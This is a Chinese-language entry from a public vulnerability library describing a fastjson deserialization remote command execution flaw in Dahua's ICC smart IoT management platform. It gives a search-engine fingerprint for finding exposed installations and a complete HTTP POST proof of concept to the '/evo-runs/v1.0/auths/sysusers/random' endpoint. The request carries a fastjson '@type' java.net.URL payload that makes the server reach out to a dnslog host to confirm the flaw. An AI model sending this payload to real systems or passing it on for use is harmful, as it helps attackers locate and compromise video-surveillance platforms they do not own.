---
fofa: "web.body="
source: "wy876 漏洞文库"
---

# 大华智能物联综合管理平台(ICC)random fastjson远程命令执行

# 一、漏洞简介
浙江大华技术股份有限公司，是全球领先的以视频为核心的智慧物联解决方案提供商和运营服务商，大华智能物联综合管理平台random 存在fastjson远程命令执行，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 大华智能物联综合管理平台(ICC)

# 三、资产测绘
+ hunter`web.body="*客户端会小于800*"`
+ 特征


# 四、漏洞复现
poc：前往dnslog获取一个地址替换下列poc中的地址发起请求

```plain
POST /evo-runs/v1.0/auths/sysusers/random HTTP/2
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0)
Connection: close
Content-Length: 372
Content-Type: application/json;charset=utf-8
Accept-Encoding: gzip, deflate

{"a":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}}""},"b":{{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}:"x"},"c":{{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}:0,"d":Set[{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}],"e":Set[{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"},}
```


dns收到响应


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ggsmd59d5g6pzrnd>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
